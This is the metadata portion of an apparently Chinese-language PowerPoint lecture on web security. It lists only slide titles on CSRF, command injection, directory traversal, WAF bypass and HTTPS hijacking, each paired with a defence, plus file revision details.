      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>伪造Cookie信息</vt:lpstr>
      <vt:lpstr>伪造Cookie信息</vt:lpstr>
      <vt:lpstr>伪造Cookie信息</vt:lpstr>
      <vt:lpstr>伪造Cookie信息</vt:lpstr>
      <vt:lpstr>监听Cookie来实现会话劫持</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>跨站请求仿冒</vt:lpstr>
      <vt:lpstr>CSRF</vt:lpstr>
      <vt:lpstr>CSRF</vt:lpstr>
      <vt:lpstr>防御CSRF攻击</vt:lpstr>
      <vt:lpstr>CSRF与XSS</vt:lpstr>
      <vt:lpstr>防御CSRF攻击</vt:lpstr>
      <vt:lpstr>防御CSRF攻击</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>目录遍历</vt:lpstr>
      <vt:lpstr>目录遍历</vt:lpstr>
      <vt:lpstr>目录遍历</vt:lpstr>
      <vt:lpstr>目录遍历</vt:lpstr>
      <vt:lpstr>目录遍历防御</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>OS命令注入</vt:lpstr>
      <vt:lpstr>OS命令注入</vt:lpstr>
      <vt:lpstr>OS命令注入</vt:lpstr>
      <vt:lpstr>OS命令注入</vt:lpstr>
      <vt:lpstr>OS命令注入防御</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>HTTP消息头注入</vt:lpstr>
      <vt:lpstr>HTTP消息头注入</vt:lpstr>
      <vt:lpstr>HTTP消息头注入</vt:lpstr>
      <vt:lpstr>HTTP消息头注入防御</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>1、恶意文件执行</vt:lpstr>
      <vt:lpstr>1、恶意文件执行</vt:lpstr>
      <vt:lpstr>1、防御恶意文件执行漏洞</vt:lpstr>
      <vt:lpstr>2、不安全的直接对象引用</vt:lpstr>
      <vt:lpstr>2、不安全的直接对象引用</vt:lpstr>
      <vt:lpstr>2、防御不安全的直接对象引用</vt:lpstr>
      <vt:lpstr> 3、信息泄露和不当的错误处理 </vt:lpstr>
      <vt:lpstr>3、信息泄露和不当的错误处理</vt:lpstr>
      <vt:lpstr>4、不当的错误处理示例</vt:lpstr>
      <vt:lpstr>4、防御信息泄露</vt:lpstr>
      <vt:lpstr>5、认证和会话管理不完善</vt:lpstr>
      <vt:lpstr>会话(Session)管理</vt:lpstr>
      <vt:lpstr>会话管理：Session ID</vt:lpstr>
      <vt:lpstr>会话管理：Session Hijacking</vt:lpstr>
      <vt:lpstr>认证和会话管理攻击流程</vt:lpstr>
      <vt:lpstr>5、防御会话管理攻击</vt:lpstr>
      <vt:lpstr>6、不安全的加密存储</vt:lpstr>
      <vt:lpstr>6、不安全的加密存储</vt:lpstr>
      <vt:lpstr>6、不安全的加密存储示例</vt:lpstr>
      <vt:lpstr>6、防御不安全的加密存储</vt:lpstr>
      <vt:lpstr>7、 URL访问缺少限制</vt:lpstr>
      <vt:lpstr>7、URL访问缺少限制</vt:lpstr>
      <vt:lpstr>7、防御缺少限制的URL访问</vt:lpstr>
      <vt:lpstr>8、组合攻击实现网站假冒</vt:lpstr>
      <vt:lpstr>8、组合攻击实现网站假冒</vt:lpstr>
      <vt:lpstr>8、组合攻击实现网站假冒</vt:lpstr>
      <vt:lpstr>8、组合攻击实现网站假冒</vt:lpstr>
      <vt:lpstr>8、组合攻击实现网站假冒</vt:lpstr>
      <vt:lpstr>内容提纲</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF的安全性</vt:lpstr>
      <vt:lpstr>WAF的安全性</vt:lpstr>
      <vt:lpstr>如何探测、绕过WAF</vt:lpstr>
      <vt:lpstr>本章小结</vt:lpstr>
      <vt:lpstr>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跟着WebGoat一起学习</vt:lpstr>
      <vt:lpstr>跟着DVWA一起学习</vt:lpstr>
      <vt:lpstr>Where to Learn More</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</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HTTPS就安全了吗</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>扩展</vt:lpstr>
      <vt:lpstr>用自签名证书伪造知名网站证书</vt:lpstr>
      <vt:lpstr>用自签名证书伪造知名网站证书</vt:lpstr>
      <vt:lpstr>用自签名证书伪造知名网站证书</vt:lpstr>
      <vt:lpstr>组合攻击实现网站假冒</vt:lpstr>
      <vt:lpstr>组合攻击实现网站假冒</vt:lpstr>
      <vt:lpstr>组合攻击实现网站假冒</vt:lpstr>
      <vt:lpstr>组合攻击实现网站假冒</vt:lpstr>
      <vt:lpstr>代理劫持</vt:lpstr>
      <vt:lpstr>代理劫持</vt:lpstr>
      <vt:lpstr>代理劫持</vt:lpstr>
      <vt:lpstr>代理劫持</vt:lpstr>
      <vt:lpstr>代理劫持</vt:lpstr>
      <vt:lpstr>代理劫持</vt:lpstr>
      <vt:lpstr>代理劫持</vt:lpstr>
      <vt:lpstr>代理劫持</vt:lpstr>
      <vt:lpstr>代理劫持</vt:lpstr>
      <vt:lpstr>代理劫持</vt:lpstr>
      <vt:lpstr>代理劫持</vt:lpstr>
      <vt:lpstr>代理劫持</vt:lpstr>
      <vt:lpstr>透明劫持</vt:lpstr>
      <vt:lpstr>透明劫持</vt:lpstr>
      <vt:lpstr>透明劫持</vt:lpstr>
      <vt:lpstr>防止HTTPS被劫持</vt:lpstr>
      <vt:lpstr>防止HTTPS被劫持</vt:lpstr>
      <vt:lpstr>防止HTTPS被劫持</vt:lpstr>
      <vt:lpstr>防止HTTPS被劫持</vt:lpstr>
      <vt:lpstr>防止HTTPS被劫持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Stronger Dady</cp:lastModifiedBy>
  <cp:revision>1506</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2004-07-10T13:16:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2022-05-24T02:18:51Z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2144E4748FA64BFCA005ABC3F13150F2</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="KSOProductBuildVer">
    <vt:lpwstr>2052-11.1.0.11691</vt:lpwstr>
  </property>
</Properties>
</file>